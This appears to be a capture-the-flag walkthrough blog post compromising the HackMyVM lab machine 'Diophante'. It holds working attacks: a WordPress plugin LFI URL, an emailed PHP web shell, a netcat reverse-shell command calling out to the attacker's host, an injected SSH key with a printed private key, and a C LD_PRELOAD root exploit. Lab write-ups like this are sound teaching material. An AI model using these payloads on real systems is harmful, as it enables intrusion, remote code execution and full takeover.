---
layout: post
title:  "HackMyVM - Diophante"
categories: [tryhackme,walkthrough]
pin: false
tags: [smtp,wordpress,lfi,wpscan,doas,ld_preload]
---

![image]( /assets/img/diophante/1.PNG)

## Nmap
```sh
┌──(alienum㉿kali)-[~]
└─$ nmap 10.0.2.235
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 12:45 EEST
Nmap scan report for hard (10.0.2.235)
Host is up (0.0045s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE
22/tcp open     ssh
25/tcp filtered smtp
80/tcp open     http
```

- Port `25` is filtered

## Gobuster

```sh
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u 10.0.2.235  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.txt,.bak,.html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.235
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,bak,html,php
[+] Timeout:                 10s
===============================================================
2021/04/18 12:45:57 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/blog                 (Status: 301) [Size: 307] [--> http://10.0.2.235/blog/]
/note.txt             (Status: 200) [Size: 36]                               
```

- The `/blog` runs wordpress

![image]( /assets/img/diophante/2.PNG)

## Read the Note


```sh
┌──(alienum㉿kali)-[~]
└─$ curl http://hard/note.txt
Dont forget: 7000 8000 9000

admin
```


## Port Knock


![image]( /assets/img/diophante/3.PNG)

```sh
┌──(alienum㉿kali)-[~/Desktop/scripts/knock]
└─$ nmap 10.0.2.235                                                                                                                                                1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 13:01 EEST
Nmap scan report for hard (10.0.2.235)
Host is up (0.0019s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

- The port `25` changed from `filtered` to `open`


## WPScan

```sh
┌──(alienum㉿kali)-[~]
└─$ wpscan --url http://hard/blog/
...
[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://hard/blog/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://hard/blog/wp-content/plugins/site-editor/readme.txt
 ...
```

## WordPress Plugin Site Editor 1.1.1 - Local File Inclusion

**Proof of Concept**
```sh
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

**Our Path**
```sh
http://hard/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

#### In Action

![image]( /assets/img/diophante/4.PNG)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
sabine:x:1000:1000:sabine,,,:/home/sabine:/bin/rbash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:107:114::/var/spool/postfix:/usr/sbin/nologin
leonard:x:1001:1001:,,,:/home/leonard:/bin/bash
```

## SMTP Log Poisoning through LFI to Remote Code Execution

- Send email from `leonard` to `sabine`
- I typed

```
HELO alien
VRFY leonard
mail from: leonard
rcpt to: sabine
data
Subject: EXPLOIT
<?php echo system($_REQUEST['cmd']); ?>
.
quit
```

![image]( /assets/img/diophante/5.PNG)


Now using the `/var/mail/sabine` i will try the RCE
The path is :
```sh
view-source:http://hard/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=id
```

![image]( /assets/img/diophante/6.PNG)

## Reverse Shell

- Browser

```sh
view-source:http://hard/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=nc%20%2010.0.2.15%204444%20-e%20/bin/bash
```

- Listener
```sh
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
```

![image]( /assets/img/diophante/7.PNG)

## Privileges Escalation | doas

- Find SUID Permissions

```sh
www-data@diophante:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/doas
...
```

- Find the `doas.conf`

```sh
www-data@diophante:~$ cat /etc/doas.conf
cat /etc/doas.conf
permit nopass www-data as sabine cmd /usr/bin/setsid
permit nopass sabine as leonard cmd /usr/bin/mutt

www-data@diophante:~$
```

`doas -u sabine /usr/bin/setsid sh`

```sh
www-data@diophante:~$ doas -u sabine /usr/bin/setsid sh
doas -u sabine /usr/bin/setsid sh
sh: 0: cant access tty; job control turned off
$ id
id
uid=1000(sabine) gid=1000(sabine) groups=1000(sabine),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
$
```

## SSH Login

- authorized_keys

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLe0DXlGG7DIv/diQkpGJrergOw2/2e1FRfRvb57jjz6fbZhcgFtb+3JrEyNeJVO6rQFKN8J5yw9UQpG5FpTMF4Yu8XaEvuUESHK98pnUmiKK6SGS4vrCJjaM5+B/TQ8iKqv2jL5hpF0DNmOyI25HekQGkNM2yUrzisBaOawKDyURPoNMHnn+bYXWOPo2S+nP4aCadcov7hD/RPPgYO68oCpuHy3kYr4S6ZTtevsl6iU/D10C/zUGuSvnVJ8zSSyIR1tw0O/N5afQvOVlzxSTg3opv4Lje/d5ofvA7ky/OWsAPfXnDZXP4wFJDZHNBGEuIhLNFQDB/4lYbiWupFZD alienum@kali" > authorized_keys
```

- id_Rsa

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEArS3tA15RhuwyL/3YkJKRia3q4DsNv9ntRUX0b2+e448+n22Y
XIBbW/tyaxMjXiVTuq0BSjfCecsPVEKRuRaUzBeGLvF2hL7lBEhyvfKZ1Joiiukh
kuL6wiY2jOfgf00PIiqr9oy+YaRdAzZjsiNuR3pEBpDTNslK84rAWjmsCg8lET6D
TB55/m2F1jj6Nkvpz+GgmnXKL+4Q/0Tz4GDuvKAqbh8t5GK+EumU7Xr7JeolPw9d
Av81Brkr51SfM0ksiEdbcNDvzeWn0LzlZc8Uk4N6Kb+C43v3eaH7wO5MvzlrAD31
5w2Vz+MBSQ2RzQRhLiISzRUAwf+JWG4lrqRWQwIDAQABAoIBAHRjMjAaWnZwFUa1
tq9rIc7DCOCML7BpeRIecqnV/ZX4NmEVWdmJFl1aP0qBATsLoRsLnJtRoC0UcIfz
eVZIO9ZyVOcFtt5+IRJg0mSgQAxnTqHHDp5WV6rV3cGTMQi9NFeFEC9R5b1fpnc7
PYOCVmJJZKB5AsqGPA4ziRTaP6o96kHkLIF3Nkz1sJZtnHcmDDmPHARDMC0xJvE+
xm8K3RfeK4G4F31TQzg/ZI2INVFCJv9hy81SmOQgIIpzTI1Y85neqJ4g7LfUFcdu
bKUSRNAvDnlPzVbkci3pcOE9XcIKX/arV6XkuSVJj+EkX3+PYZm3oZqeF29wqHsP
9m0Qw2ECgYEA2aoA4cvJ3LGo1SWeX+mt/wERf3H+xGgjhN0OyAzWp0UB6IcaUkzx
kISztdqNlSa69hZ5pHbJRYe3ulbbCaouxt3+u6OSg4sw3unf7dmpzyz4uBs4gGw2
GUThr1sVdbBkrazn69d1USZ/kPw7GqQIDBLh9JZNJSnmQBLitGt49/ECgYEAy640
pg3rE8OPEy7wA6FK2Ld2mykb4NpjcX5spTXM1BiNPK2IT9tt5YzwlzY88hGrmXeR
i/AmWIrT3y4HN3pppDeuqrZpBA9qEhwYpApHB3xojhTiZcCYdZ/YBnMNDqZNjvp+
iAQ8S44PnRXI2qeEzwR+hC60FZFv+eg8/2UJRXMCgYEAgni5FqAFXFjSDxIBoRR9
y8FkL7SxNiIGSHoJhjjL4nAm+K8jQ/oDQtGIt5VOEP2qTCCkwcTCWP9FTlkJ6v0s
FOC09NzT0i35GWWvaO90Lk+Styj58WDr/LGhZm9+qZEWiFSAoIoCNKaTCOFovEte
133qG6aMj55R+k5XvjY9yMECgYEAvjOf1rGIpJwqL6/VUo58ZoRsrdhlwEQwOPvm
WSE0dZu3yMIEWQ6AQayrv4lWwHbf2CBgOl24cVazI+bHtncJz+Bvq9tLlg8O7npu
SEGQstzqhkPaZ0rDFJSAFwW5W8TRCIPDRSEvbR7sVbTSK93jl66KtsUmRj3aY3UM
ATNIxSECgYBhSyM6UfTbOWId8LSRn0u/Z06bOQ0bPDKjksFY8ESDJzCRI0LIjmal
ZyA+4wLSp3AemizoQXG6CKjayLd0P1LiEUHZQY5AzUh+L81BiglksRYSIdujfO4Q
G4nGiJOiOEZAdkKKONJ5zVNDiASTODqByEeUA6lzX3gyYL3vDvUwQg==
-----END RSA PRIVATE KEY-----
```

![image]( /assets/img/diophante/8.PNG)


## Doas Again

`doas -u leonard /usr/bin/mutt`

`SHIFT + 1`

`/bin/sh`

![image]( /assets/img/diophante/9.PNG)

![image]( /assets/img/diophante/10.PNG)


## SSH Leonard using the same keys

![image]( /assets/img/diophante/11.PNG)

## Root

- `sudo -l`

```sh
leonard@diophante:~$ sudo -l
Entrées Defaults correspondant pour leonard sur diophante :
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=LD_PRELOAD

Lutilisateur leonard peut utiliser les commandes suivantes sur diophante :
    (ALL : ALL) NOPASSWD: /usr/bin/ping
leonard@diophante:~$
```

Google is my friend
I searched `env_keep+=LD_PRELOAD priv esc` and gave me this nice article :
[Linux Privilege Escalation using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

#### In Action

`cd /tmp`

`nano shell.c`

- Paste this

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`


`sudo LD_PRELOAD=/tmp/shell.so ping`

`whoami`

```sh
leonard@diophante:/tmp$ sudo LD_PRELOAD=/tmp/shell.so ping
# id
uid=0(root) gid=0(root) groupes=0(root)
#
```


![image]( /assets/img/diophante/12.PNG)
